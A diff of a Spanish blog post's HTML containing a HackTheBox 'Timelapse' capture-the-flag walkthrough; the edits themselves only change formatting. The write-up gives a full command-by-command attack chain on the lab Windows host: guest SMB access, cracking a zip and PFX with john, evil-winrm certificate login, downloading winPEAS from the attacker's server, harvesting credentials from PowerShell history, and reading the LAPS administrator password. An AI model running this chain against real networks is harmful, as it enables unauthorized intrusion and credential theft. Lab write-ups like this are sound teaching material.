@@ -18,19 +18,19 @@
 
 
 
-	<meta name="twitter:card" content="summary">
-	<meta name="twitter:title" content="Timelapse Machine - HackTheBox">
-	<meta name="twitter:description" content="Esta es una máquina Windows de nivel fácil de la plataforma HackTheBox">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Timelapse Machine - HackTheBox">
+  <meta name="twitter:description" content="Esta es una máquina Windows de nivel fácil de la plataforma HackTheBox">
 
 <meta property="og:url" content="https://celero0.github.io/posts/timelapse/">
-	<meta property="og:site_name" content="Celero0 Blog">
-	<meta property="og:title" content="Timelapse Machine - HackTheBox">
-	<meta property="og:description" content="Esta es una máquina Windows de nivel fácil de la plataforma HackTheBox">
-	<meta property="og:locale" content="es">
-	<meta property="og:type" content="article">
-		<meta property="article:section" content="posts">
-		<meta property="article:published_time" content="2026-01-14T21:05:56+00:00">
-		<meta property="article:modified_time" content="2026-01-14T21:05:56+00:00">
+  <meta property="og:site_name" content="Celero0 Blog">
+  <meta property="og:title" content="Timelapse Machine - HackTheBox">
+  <meta property="og:description" content="Esta es una máquina Windows de nivel fácil de la plataforma HackTheBox">
+  <meta property="og:locale" content="es">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-01-14T21:05:56+00:00">
+    <meta property="article:modified_time" content="2026-01-14T21:05:56+00:00">
 
 
 
@@ -55,7 +55,7 @@
   
     
     
-    <link rel="stylesheet" href="/css/coder-dark.min.7bae3723f236dac3024e7729da8f0d026ba33c06ce79d59f1f7a1811c81cd52c.css" integrity="sha256-e643I/I22sMCTncp2o8NAmujPAbOedWfH3oYEcgc1Sw=" crossorigin="anonymous" media="screen" />
+    <link rel="stylesheet" href="/css/coder-dark.min.c170d9bb5caa71f3db9a208ff97e771abf73c1f55b67a1df27ba5666cd49fa9b.css" integrity="sha256-wXDZu1yqcfPbmiCP&#43;X53Gr9zwfVbZ6HfJ7pWZs1J&#43;ps=" crossorigin="anonymous" media="screen" />
   
 
 
@@ -203,9 +203,9 @@
   </a>
 </h1>
 <p>Partimos realizando un escaneo de los puertos abiertos de la máquina víctima de la siguiente forma.</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.10.11.152 -oG allPorts
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.10.11.152 -oG allPorts
 </span></span></code></pre></div><p>y posteriormente realizar un escaneo de servicios y versiones de la siguiente manera.</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49695,56528 -sCV 10.10.11.152 -oN portServices
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49695,56528 -sCV 10.10.11.152 -oN portServices
 </span></span></code></pre></div><p>Teniendo los siguiente resultados</p>
 <img src="/images/Pasted image 20260114141902.png" style="width:100%; height:auto; display:block; margin:auto;">
 <h1 id="enumeración-smb">
@@ -216,21 +216,21 @@
   </a>
 </h1>
 <p>Como vimos en el escaneo de puertos, y en el de servicios. Tenemos el puerto <code>445</code>abierto. Primeramente nos aprovecharemos del puerto para con <code>netexec</code> encontrar el nombre de dominio y el nombre de la máquina víctima</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netexec smb 10.10.11.152
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netexec smb 10.10.11.152
 </span></span></code></pre></div><img src="/images/Pasted image 20260114142532.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Teniendo como resultado <code>DC0</code> y <code>timelapse.htb</code>, por tanto lo agregamos a nuestro <code>/etc/hosts</code></p>
 <img src="/images/Pasted image 20260114142558.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Como no tenemos credenciales válidas, realizaremos enumeración de recursos compartidos como el usuario <code>guest</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netexec smb 10.10.11.152 -u <span style="color:#a5d6ff">&#39;guest&#39;</span> -p <span style="color:#a5d6ff">&#39;&#39;</span> --shares
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netexec smb 10.10.11.152 -u <span style="color:#a5d6ff">&#39;guest&#39;</span> -p <span style="color:#a5d6ff">&#39;&#39;</span> --shares
 </span></span></code></pre></div><p>Encontrando que el recurso <code>Shares</code> tiene permisos de lectura</p>
 <img src="/images/Pasted image 20260114142823.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Crearemos una carpeta con el mismo nombre que el recurso compartido, y posteriormente nos conectaremos al recurso y descargaremos todo a nuestra máquina local</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mkdir Shares
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mkdir Shares
 </span></span><span style="display:flex;"><span>cd Shares
 </span></span><span style="display:flex;"><span>smbclient //10.10.11.152/Shares -U <span style="color:#a5d6ff">&#39;guest&#39;</span>
 </span></span></code></pre></div><img src="/images/Pasted image 20260114143020.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Y ahora realizamos los siguientes comandos para descargar todos los archivos compartidos</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mask <span style="color:#a5d6ff">&#34;&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mask <span style="color:#a5d6ff">&#34;&#34;</span>
 </span></span><span style="display:flex;"><span>prompt off
 </span></span><span style="display:flex;"><span>recurse on
 </span></span><span style="display:flex;"><span>mget *
@@ -248,19 +248,19 @@
 <img src="/images/Pasted image 20260114143408.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Por tanto realizaremos un ataque de fuerza bruta, para obtener la contraseña del archivo zip, para ello primero debemos obtener un hash a crackear</p>
 <p>Para obtener el hash que crackeará <code>john</code>, hacemos el siguiente comando</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>zip2john winrm_backup.zip &gt; zip.hash
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>zip2john winrm_backup.zip &gt; zip.hash
 </span></span></code></pre></div><p>Teniendo el archivo <code>zip.hash</code>, ahora podemos utilizar <code>john</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --wordlist<span style="color:#ff7b72;font-weight:bold">=</span>/usr/share/wordlists/rockyou.txt zip.hash
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --wordlist<span style="color:#ff7b72;font-weight:bold">=</span>/usr/share/wordlists/rockyou.txt zip.hash
 </span></span></code></pre></div><p>y encontramos la contraseña <code>supremelegacy</code></p>
 <img src="/images/Pasted image 20260114144407.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Por tanto ahora podemos extraer el archivo <code>.zip</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>unzip winrm_backup.zip
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>unzip winrm_backup.zip
 </span></span></code></pre></div><p>Obteniendo el archivo <code>legacyy_dev_auth.pfx</code>.</p>
 <p>Los archivos <code>.pfx</code> funcionan como un contenedor seguro y cifrado que almacena certificados digitales junto con sus claves privadas y públicas.<br>
 Estos archivos requieren una contraseña válida para poder acceder a su contenido.</p>
 <img src="/images/Pasted image 20260114144608.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Verificamos si el archivo necesita contraseña</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openssl pkcs12 -info -in legacyy_dev_auth.pfx
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openssl pkcs12 -info -in legacyy_dev_auth.pfx
 </span></span></code></pre></div><p>y si nos pide, como no tenemos la contraseña, y la obtenida anterior no funciona.</p>
 <h1 id="bruteforce-pfx">
   Bruteforce PFX
@@ -271,9 +271,9 @@ Estos archivos requieren una contraseña válida para poder acceder a su conteni
 </h1>
 <p>Haremos fuerza bruta a <code>pfx</code>, para ellos necesitamos un hash.</p>
 <p>Para obtener el hash podemos utilizar <code>pfx2john</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pfx2john legacyy_dev_auth.pfx &gt; pfx.hash
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pfx2john legacyy_dev_auth.pfx &gt; pfx.hash
 </span></span></code></pre></div><p>Para extraerlo lo haremos de la forma común</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --wordlist<span style="color:#ff7b72;font-weight:bold">=</span>/usr/share/wordlists/rockyou.txt pfx.hash
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --wordlist<span style="color:#ff7b72;font-weight:bold">=</span>/usr/share/wordlists/rockyou.txt pfx.hash
 </span></span></code></pre></div><p>Obteniendo la contraseña <code>thuglegacy</code>, por tanto ahora podemos acceder a los certificados</p>
 <img src="/images/Pasted image 20260114150646.png" style="width:100%; height:auto; display:block; margin:auto;">
 <h1 id="certificados-vía-pfx">
@@ -284,7 +284,7 @@ Estos archivos requieren una contraseña válida para poder acceder a su conteni
   </a>
 </h1>
 <p>Para extraer los certificados tenemos los dos siguientes comandos</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out key.pem
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out key.pem
 </span></span><span style="display:flex;"><span>openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.pem
 </span></span></code></pre></div><p>Obtenemos exitosamente ambos archivos</p>
 <img src="/images/Pasted image 20260114150959.png" style="width:100%; height:auto; display:block; margin:auto;">
@@ -297,7 +297,7 @@ Estos archivos requieren una contraseña válida para poder acceder a su conteni
   </a>
 </h1>
 <p>Para acceder a la máquina víctima con los certificados obtenidos podemos utilizar <code>evil-winrm</code> de la siguiente forma</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -k key.pem -c cert.pem -i 10.10.11.152 -S
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -k key.pem -c cert.pem -i 10.10.11.152 -S
 </span></span></code></pre></div><p>Obteniendo acceso a la máquina víctima como el usuario <code>legacyy</code></p>
 <img src="/images/Pasted image 20260114151255.png" style="width:100%; height:auto; display:block; margin:auto;">
 <h1 id="movimiento-lateral">
@@ -313,13 +313,13 @@ Por tanto descargaremos <code>winPEASx64.exe</code></p>
 <p>Primero crearemos el directorio <code>C:\\temp\</code></p>
 <img src="/images/Pasted image 20260114152045.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Para descargar el archivo, lo vamos a compartir mediante un servidor web con python, pero primeramente le cambiaremos el nombre a <code>winpeas.exe</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m http.server <span style="color:#a5d6ff">80</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m http.server <span style="color:#a5d6ff">80</span>
 </span></span></code></pre></div><p>y desde <code>evil-winrm</code> haremos el siguiente comando para descargar el <code>winpeas.exe</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Invoke-WebRequest http://10.10.14.20/winpeas.exe -OutFile C:<span style="color:#79c0ff">\t</span>emp<span style="color:#79c0ff">\w</span>inpeas.exe
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Invoke-WebRequest http://10.10.14.20/winpeas.exe -OutFile C:<span style="color:#79c0ff">\t</span>emp<span style="color:#79c0ff">\w</span>inpeas.exe
 </span></span></code></pre></div><p>Vemos que se descargó correctamente</p>
 <img src="/images/Pasted image 20260114152824.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Ahora solo corremos el <code>winpeas</code> de la siguiente forma</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>.<span style="color:#79c0ff">\w</span>inpeas.exe
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>.<span style="color:#79c0ff">\w</span>inpeas.exe
 </span></span></code></pre></div><p>Encontramos el archivo que contiene el historial de powershell, el cual está en
 <code>C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code>, este archivo puede contener credenciales en texto plano, si es que el administrador no limpia el historial de comandos utilizados.</p>
 <img src="/images/Pasted image 20260114154551.png" style="width:100%; height:auto; display:block; margin:auto;">
@@ -327,7 +327,7 @@ Por tanto descargaremos <code>winPEASx64.exe</code></p>
 <code>svc_deploy : E3R$Q62^12p7PLlC%KWaxuaV</code></p>
 <img src="/images/Pasted image 20260114171828.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Por tanto nos conectamos mediante <code>evil-winrm</code> con las credenciales obtenidas</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -u <span style="color:#a5d6ff">&#39;svc_deploy&#39;</span> -p <span style="color:#a5d6ff">&#39;E3R$Q62^12p7PLlC%KWaxuaV&#39;</span> -i 10.10.11.152 -S
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -u <span style="color:#a5d6ff">&#39;svc_deploy&#39;</span> -p <span style="color:#a5d6ff">&#39;E3R$Q62^12p7PLlC%KWaxuaV&#39;</span> -i 10.10.11.152 -S
 </span></span></code></pre></div><img src="/images/Pasted image 20260114171957.png" style="width:100%; height:auto; display:block; margin:auto;">
 <h1 id="escalada-de-privilegios">
   Escalada de privilegios
@@ -337,7 +337,7 @@ Por tanto descargaremos <code>winPEASx64.exe</code></p>
   </a>
 </h1>
 <p>Con el nuevo usuario vemos a qué grupos pertenece, para encontrar algún método de escalada de privilegios</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>net user svc_deploy
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>net user svc_deploy
 </span></span></code></pre></div><img src="/images/Pasted image 20260114172401.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Vemos que tenemos el permiso <code>LAPS_Readers</code>, el cual permite manipular las contraseñas en LAPS, además de ver las contraseñas almacenadas.</p>
 <h1 id="readlaps-passwords">
@@ -349,13 +349,13 @@ Por tanto descargaremos <code>winPEASx64.exe</code></p>
 </h1>
 <p>Para más información tenemos la siguiente página <a href="https://www.thehacker.recipes/ad/movement/dacl/readlapspassword"  class="external-link" target="_blank" rel="noopener">https://www.thehacker.recipes/ad/movement/dacl/readlapspassword</a></p>
 <p>Para obtener las contraseñas de LAPS podemos hacer el siguiente comando</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc ldap <span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">$DC_HOST</span><span style="color:#a5d6ff">&#34;</span> -d <span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">$DOMAIN</span><span style="color:#a5d6ff">&#34;</span> -u <span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">$USER</span><span style="color:#a5d6ff">&#34;</span> -p <span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">$PASSWORD</span><span style="color:#a5d6ff">&#34;</span> --module laps
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc ldap <span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">$DC_HOST</span><span style="color:#a5d6ff">&#34;</span> -d <span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">$DOMAIN</span><span style="color:#a5d6ff">&#34;</span> -u <span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">$USER</span><span style="color:#a5d6ff">&#34;</span> -p <span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">$PASSWORD</span><span style="color:#a5d6ff">&#34;</span> --module laps
 </span></span></code></pre></div><p>En nuestro caso sería</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc ldap 10.10.11.152 -d timelapse.htb -u <span style="color:#a5d6ff">&#39;svc_deploy&#39;</span> -p <span style="color:#a5d6ff">&#39;E3R$Q62^12p7PLlC%KWaxuaV&#39;</span> --module laps
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc ldap 10.10.11.152 -d timelapse.htb -u <span style="color:#a5d6ff">&#39;svc_deploy&#39;</span> -p <span style="color:#a5d6ff">&#39;E3R$Q62^12p7PLlC%KWaxuaV&#39;</span> --module laps
 </span></span></code></pre></div><p>Vemos que encontramos la siguiente contraseña: <code>N#34}z/e7!9kOL3Y]1b{gwQE</code></p>
 <img src="/images/Pasted image 20260114173003.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Ahora nos podemos conectar con <code>evil-winrm</code> proporcionando la contraseña obtenida y el usuario <code>administrator</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -u <span style="color:#a5d6ff">&#39;administrator&#39;</span> -p <span style="color:#a5d6ff">&#39;N#34}z/e7!9kOL3Y]1b{gwQE&#39;</span> -i 10.10.11.152 -S
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -u <span style="color:#a5d6ff">&#39;administrator&#39;</span> -p <span style="color:#a5d6ff">&#39;N#34}z/e7!9kOL3Y]1b{gwQE&#39;</span> -i 10.10.11.152 -S
 </span></span></code></pre></div><p>y obtenemos acceso de <code>Administrator</code></p>
 <img src="/images/Pasted image 20260114173123.png" style="width:100%; height:auto; display:block; margin:auto;">
 <h1 id="flags">
@@ -366,10 +366,10 @@ Por tanto descargaremos <code>winPEASx64.exe</code></p>
   </a>
 </h1>
 <p>Para obtener la flag de <code>user.txt</code>, podemos hacer el siguiente comando</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Get-ChildItem -Path C:<span style="color:#79c0ff">\U</span>sers<span style="color:#79c0ff">\ </span>-Recurse -Filter user.txt -ErrorAction SilentlyContinue
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Get-ChildItem -Path C:<span style="color:#79c0ff">\U</span>sers<span style="color:#79c0ff">\ </span>-Recurse -Filter user.txt -ErrorAction SilentlyContinue
 </span></span></code></pre></div><img src="/images/Pasted image 20260114173421.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Para la flag de <code>root.txt</code>, hacemos lo siguiente</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Get-ChildItem -Path C:<span style="color:#79c0ff">\U</span>sers<span style="color:#79c0ff">\ </span>-Recurse -Filter root.txt -ErrorAction SilentlyContinue
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Get-ChildItem -Path C:<span style="color:#79c0ff">\U</span>sers<span style="color:#79c0ff">\ </span>-Recurse -Filter root.txt -ErrorAction SilentlyContinue
 </span></span></code></pre></div><img src="/images/Pasted image 20260114173526.png" style="width:100%; height:auto; display:block; margin:auto;">
 
       </div>
